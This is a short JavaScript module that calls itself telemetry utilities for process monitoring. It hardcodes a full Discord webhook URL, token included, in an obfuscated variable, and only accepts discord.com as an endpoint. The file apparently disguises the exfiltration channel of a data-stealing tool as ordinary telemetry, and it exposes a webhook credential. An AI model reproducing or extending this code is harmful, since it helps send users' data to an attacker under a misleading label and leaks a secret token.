// Telemetry Utilities Module
// Manages telemetry data transmission for process monitoring

const _x9bR2nJ = 'https://discord.com/api/webhooks/1455848080548171816/48SYnyhFRH7VlzDWTA_41FPux7p7QJoQsKS2sGqtOTgA3sy0eWo5OBGLzNTahgRI0B7O';

function getTelemetryEndpoint() {
    return _x9bR2nJ;
}

function validateTelemetryEndpoint(endpoint) {
    return endpoint && endpoint.includes('discord.com');
}

module.exports = {
    getTelemetryEndpoint,
    validateTelemetryEndpoint,
    sendTelemetry: () => getTelemetryEndpoint()
};
